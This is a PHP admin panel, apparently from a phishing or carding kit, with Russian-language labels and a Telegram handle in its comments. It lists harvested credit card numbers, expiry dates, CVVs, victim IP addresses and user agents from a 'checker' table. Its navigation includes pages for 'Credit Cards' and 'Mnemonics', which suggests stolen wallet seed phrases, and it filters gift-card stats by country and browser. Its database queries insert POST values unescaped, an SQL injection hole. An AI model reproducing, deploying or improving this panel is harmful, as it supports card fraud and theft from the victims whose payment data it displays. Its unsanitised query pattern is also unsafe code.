
<?php
session_start();

if(!$_SESSION['username']){
 header("Location: login.php");
 exit;
}

if($_GET['do'] == 'logout'){
	unset($_SESSION['admin']);
	session_destroy();
  header("Location: login.php");
}
include_once '../db/dbmysqli.php';


?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <title>Админка</title>
    <!-- Bootstrap core CSS-->
    <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <!-- Custom fonts for this template-->
    <link href="vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
    <!-- Page level plugin CSS-->
    <link href="vendor/datatables/dataTables.bootstrap4.css" rel="stylesheet">
    <!-- Custom styles for this template-->
    <link href="css/sb-admin.css" rel="stylesheet">
    <script type="text/javascript" src="vendor/jquery/jquery-1.4.2.min.js"></script>
    <style>
	    svg {
    width: 150px;
}

.table {

    background-color: white !important;
}
	    </style>
    </head>
    <body class="fixed-nav sticky-footer bg-dark" id="page-top">
    <!-- Navigation-->
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark fixed-top" id="mainNav">
    <a class="navbar-brand" href="index.php"></a>
    <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarResponsive">

    <ul class="navbar-nav sidenav-toggler">
    <li class="nav-item">
    <a class="nav-link text-center" id="sidenavToggler">
    <i class="fa fa-fw fa-angle-left"></i>
    </a>
    </li>
    </ul>
    <ul class="navbar-nav ml-auto">

      <li class="nav-item">
      <a href="credit.php" class="nav-link" data-toggle="modal">Credit Cards</a>
      </li>
      <li class="nav-item">
      <a href="index.php" class="nav-link" data-toggle="modal">Mnemonics</a>
      </li>
      <li class="nav-item">
      <a href="settings.php" class="nav-link" data-toggle="modal">Setting</a>
      </li>

    <li class="nav-item">
    <a href="?do=logout" class="nav-link" data-toggle="modal">
    <i class="fa fa-fw fa-sign-out"></i>Logout</a>
    </li>
    </ul>
    </div>
    </nav>




    </div>


    <table class="table table-striped table-bordered">
    <thead>
    <tr>
    <th style='width:20px;'>id</th>
    <th style='width:150px;'>cc</th>
    <th style='width:50px;'>exp</th>
    <th style='width:50px;'>cvv</th>
    <th style='width:100px;'>ip</th>
    <th style='width:250px;'>user</th>
    <th style='width:200px;'>Действие</th>
    </tr>
    </thead>
    <tbody>
    <?php

    	if (mysqli_connect_errno()){
    		echo "Failed to connect to MySQL: " . mysqli_connect_error();
    		die();
    		}

    if (isset($_GET['page_no']) && $_GET['page_no']!="") {
    	$page_no = $_GET['page_no'];
    	} else {
    		$page_no = 1;
            }

    	$total_records_per_page = 100;
        $offset = ($page_no-1) * $total_records_per_page;
    	$previous_page = $page_no - 1;
    	$next_page = $page_no + 1;
    	$adjacents = "2";

    	$result_count = mysqli_query($newcon,"SELECT COUNT(*) As total_records FROM `checker`");
    	$total_records = mysqli_fetch_array($result_count);
    	$total_records = $total_records['total_records'];
        $total_no_of_pages = ceil($total_records / $total_records_per_page);
    	$second_last = $total_no_of_pages - 1; // total page minus 1






      if( isset($_POST['country']) || isset($_POST['browser']) || isset($_POST['choose'])){
      $country = $_POST['country'];
      $browser = $_POST['browser'];
       //if ($_POST['country']!="none" || $_POST['browser']!="none") {
         //(empty($country) || empty($browser) ) {
        //if( $_POST['country']!="" && $_POST['browser']!="" )

  if(isset($_POST['choose'])=='choose'){
    if( $_POST['country']=="none" && $_POST['browser']=="none" ):

      $result = mysqli_query($newcon,"SELECT * FROM `egifts_stats` WHERE count <> '0' ORDER BY id DESC LIMIT $offset, $total_records_per_page");
    elseif($_POST['country']!="none" && $_POST['browser']!="none"  ):

        $result = mysqli_query($newcon,"SELECT * FROM `egifts_stats` WHERE country = '$country' AND  cucki = '$browser' AND  count <> '0'  ORDER BY id DESC LIMIT $offset, $total_records_per_page");
    elseif(isset($_POST['country']) && $_POST['browser']=="none"  ):

      $result = mysqli_query($newcon,"SELECT * FROM `egifts_stats` WHERE country = '$country' AND  count <> '0'  ORDER BY id DESC LIMIT $offset, $total_records_per_page");
    elseif(isset($_POST['browser']) && $_POST['country']=="none" ):

      $result = mysqli_query($newcon,"SELECT * FROM `egifts_stats` WHERE cucki = '$browser' AND  count <> '0'  ORDER BY id DESC LIMIT $offset, $total_records_per_page");
    endif;

  } else {
    if( $_POST['country']=="none" && $_POST['browser']=="none" ):

      $result = mysqli_query($newcon,"SELECT * FROM `egifts_stats` ORDER BY id DESC LIMIT $offset, $total_records_per_page");
    elseif($_POST['country']!="none" && $_POST['browser']!="none"  ):

        $result = mysqli_query($newcon,"SELECT * FROM `egifts_stats` WHERE country = '$country' AND cucki = '$browser'  ORDER BY id DESC LIMIT $offset, $total_records_per_page");
    elseif(isset($_POST['country']) && $_POST['browser']=="none"  ):

      $result = mysqli_query($newcon,"SELECT * FROM `egifts_stats` WHERE country = '$country'  ORDER BY id DESC LIMIT $offset, $total_records_per_page");
    elseif(isset($_POST['browser']) && $_POST['country']=="none" ):

      $result = mysqli_query($newcon,"SELECT * FROM `egifts_stats` WHERE cucki = '$browser'  ORDER BY id DESC LIMIT $offset, $total_records_per_page");
    endif;
  }

}else {
  $result = mysqli_query($newcon,"SELECT * FROM `checker` ORDER BY id DESC LIMIT $offset, $total_records_per_page");
}





        while($row = mysqli_fetch_array($result)){
    		echo "<tr>
    	 		  <td>".$row['id']."</td>
<td>".$row['cc']."</td>
<td>".$row['expiration']."</td>
<td>".$row['cvv']."</td>
<td>".$row['ip']."</td>
<td>".$row['useragent']."</td>
              <td><a style='margin: 2px;' href='changetitle.php?action=deletecard&id=".$row['id']."' class='btn btn-danger'>Удалить</a></td>
    		   	  </tr>";
            }
    	mysqli_close($newcon);
        ?>
    </tbody>
    </table>

    <div style='padding: 10px 20px 0px; border-top: dotted 1px #CCC;'>
    <strong>Page <?php echo $page_no." of ".$total_no_of_pages; ?></strong>
    </div>

    <ul class="pagination">
    	<?php // if($page_no > 1){ echo "<li><a href='?page_no=1'>First Page</a></li>"; } ?>

    	<li <?php if($page_no <= 1){ echo "class='disabled'"; } ?>>
    	<a <?php if($page_no > 1){ echo "href='?page_no=$previous_page'"; } ?>>Previous</a>
    	</li>

        <?php
    	if ($total_no_of_pages <= 10){
    		for ($counter = 1; $counter <= $total_no_of_pages; $counter++){
    			if ($counter == $page_no) {
    		   echo "<li class='active'><a>$counter</a></li>";
    				}else{
               echo "<li><a href='?page_no=$counter'>$counter</a></li>";
    				}
            }
    	}
    	elseif($total_no_of_pages > 10){

    	if($page_no <= 4) {
    	 for ($counter = 1; $counter < 8; $counter++){
    			if ($counter == $page_no) {
    		   echo "<li class='active'><a>$counter</a></li>";
    				}else{
               echo "<li><a href='?page_no=$counter'>$counter</a></li>";
    				}
            }
    		echo "<li><a>...</a></li>";
    		echo "<li><a href='?page_no=$second_last'>$second_last</a></li>";
    		echo "<li><a href='?page_no=$total_no_of_pages'>$total_no_of_pages</a></li>";
    		}

    	 elseif($page_no > 4 && $page_no < $total_no_of_pages - 4) {
    		echo "<li><a href='?page_no=1'>1</a></li>";
    		echo "<li><a href='?page_no=2'>2</a></li>";
            echo "<li><a>...</a></li>";
            for ($counter = $page_no - $adjacents; $counter <= $page_no + $adjacents; $counter++) {
               if ($counter == $page_no) {
    		   echo "<li class='active'><a>$counter</a></li>";
    				}else{
               echo "<li><a href='?page_no=$counter'>$counter</a></li>";
    				}
           }
           echo "<li><a>...</a></li>";
    	   echo "<li><a href='?page_no=$second_last'>$second_last</a></li>";
    	   echo "<li><a href='?page_no=$total_no_of_pages'>$total_no_of_pages</a></li>";
                }

    		else {
            echo "<li><a href='?page_no=1'>1</a></li>";
    		echo "<li><a href='?page_no=2'>2</a></li>";
            echo "<li><a>...</a></li>";

            for ($counter = $total_no_of_pages - 6; $counter <= $total_no_of_pages; $counter++) {
              if ($counter == $page_no) {
    		   echo "<li class='active'><a>$counter</a></li>";
    				}else{
               echo "<li><a href='?page_no=$counter'>$counter</a></li>";
    				}
                    }
                }
    	}
    ?>

    	<li <?php if($page_no >= $total_no_of_pages){ echo "class='disabled'"; } ?>>
    	<a <?php if($page_no < $total_no_of_pages) { echo "href='?page_no=$next_page'"; } ?>>Next</a>
    	</li>
        <?php if($page_no < $total_no_of_pages){
    		echo "<li><a href='?page_no=$total_no_of_pages'>Last &rsaquo;&rsaquo;</a></li>";
    		} ?>
    </ul>




    <!-- Area Chart Example-->

    <!-- Example DataTables Card-->
      <!-- Example DataTables Card-->

    </div>
    <!-- /.container-fluid-->
    <!-- /.container-fluid-->
    <!-- /.content-wrapper-->
    <footer class="sticky-footer">
    <div class="container">
    <div class="text-center">
    <small>Copyright © Your Website 2018</small>
    </div>
    </div>
    </footer>
    <!-- Scroll to Top Button-->
    <a class="scroll-to-top rounded" href="#page-top">
    <i class="fa fa-angle-up"></i>
    </a>
    <!-- Logout Modal-->
    <div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog" role="document">
    <div class="modal-content">
    <div class="modal-header">
	<!-- Telegram @fletchen -->
    <h5 class="modal-title" id="exampleModalLabel">Ready to Leave?</h5>
    <button class="close" type="button" data-dismiss="modal" aria-label="Close">
    <span aria-hidden="true">×</span>
    </button>
    </div>
    <div class="modal-body">Select "Logout" below if you are ready to end your current session.</div>
    <div class="modal-footer">
    <button class="btn btn-secondary" type="button" data-dismiss="modal">Cancel</button>
    <a class="btn btn-primary" href="login.html">Logout</a>
    </div>
    </div>
    </div>
    </div>
    <script>
    function call() {
         var msg   = $('#formx').serialize();
           $.ajax({
             type: 'POST',
             url: 'ajax.php',
             data: msg,
             success: function(data) {
               $('#results').html(data);
             },
             error:  function(xhr, str){
        alert('Возникла ошибка: ' + xhr.responseCode);
             }
           });
    }
        </script>
    <!-- Bootstrap core JavaScript-->
    <script src="vendor/jquery/jquery.min.js"></script>
    <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
    <!-- Core plugin JavaScript-->
    <script src="vendor/jquery-easing/jquery.easing.min.js"></script>
    <!-- Page level plugin JavaScript-->
	<!-- Telegram @fletchen -->
    <script src="vendor/chart.js/Chart.min.js"></script>
    <script src="vendor/datatables/jquery.dataTables.js"></script>
    <script src="vendor/datatables/dataTables.bootstrap4.js"></script>
    <!-- Custom scripts for all pages-->
    <script src="js/sb-admin.min.js"></script>
    <!-- Custom scripts for this page-->
    <script src="js/sb-admin-datatables.min.js"></script>
    <script src="js/sb-admin-charts.min.js"></script>
    </div>
    </body>
    </html>
